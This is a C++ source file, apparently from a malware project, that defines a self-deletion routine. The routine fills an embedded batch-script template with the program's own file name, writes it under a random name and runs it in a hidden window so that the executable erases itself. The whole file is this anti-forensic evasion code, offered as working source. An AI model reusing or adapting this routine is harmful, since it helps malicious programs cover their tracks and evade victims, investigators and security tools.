#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

BOOL fnSelfDeleteW(
	_In_ WCHAR szCd[],
	_In_ WCHAR szMfn[]
) {
	DWORD dwBufferSize = NULL;
	HANDLE hHeap = GetProcessHeap();
	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";

	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA_0x01, &dwBufferSize);
	if (lpBuffer) {
		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
		if (pszDest) {
			SIZE_T ulHeap = HeapSize(hHeap, NULL, pszDest);
			if (ulHeap != (SIZE_T)-1) {
				if (SUCCEEDED(StringCbPrintf((LPWSTR)pszDest, ulHeap, (LPCWSTR)lpBuffer, szMfn, szMfn, szBat))) {
					if (fnSaveResourceW(szBat.c_str(), pszDest, ulHeap)) {
						INT dwError = (INT)ShellExecute(NULL, L"open", szBat.c_str(), NULL, szCd, SW_HIDE);
						if (dwError > 32) {
							HeapFree(hHeap, NULL, pszDest);
							return TRUE;
						} else {

						}
					} else {

					}
				} else {

				}
			} else {

			}

			HeapFree(hHeap, NULL, pszDest);
		} else {

		}
	}

	return FALSE;
}